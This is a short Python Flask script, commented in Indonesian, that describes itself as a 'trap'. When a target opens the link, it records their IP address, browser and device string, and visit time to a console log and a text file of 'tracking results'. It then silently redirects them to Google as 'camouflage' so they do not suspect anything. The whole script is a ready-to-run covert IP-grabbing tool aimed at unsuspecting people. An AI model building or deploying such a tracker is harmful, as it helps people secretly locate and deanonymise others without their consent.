from flask import Flask, request, redirect
from datetime import datetime

app = Flask(__name__)

# Ini adalah "jebakan"
@app.route('/')
def home():
    # 1. MENGAMBIL DATA
    # Mengambil IP Address target
    target_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    # Mengambil User Agent (Info Browser & OS)
    user_agent = request.headers.get('User-Agent')
    # Mencatat waktu
    waktu = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    # 2. MENYIMPAN DATA (LOGGING)
    print(f"\n[+] TARGET TERDETEKSI!")
    print(f"    Waktu: {waktu}")
    print(f"    IP: {target_ip}")
    print(f"    Device: {user_agent}")
    
    # Simpan ke file txt agar permanen
    with open("hasil_pelacakan.txt", "a") as f:
        f.write(f"{waktu} | IP: {target_ip} | Device: {user_agent}\n")

    # 3. PENGALIHAN (CAMOUFLAGE)
    # Alihkan target ke Google agar tidak curiga
    return redirect("https://www.google.com")

if __name__ == '__main__':
    # Menjalankan server di port 5000
    app.run(port=5000, debug=True)
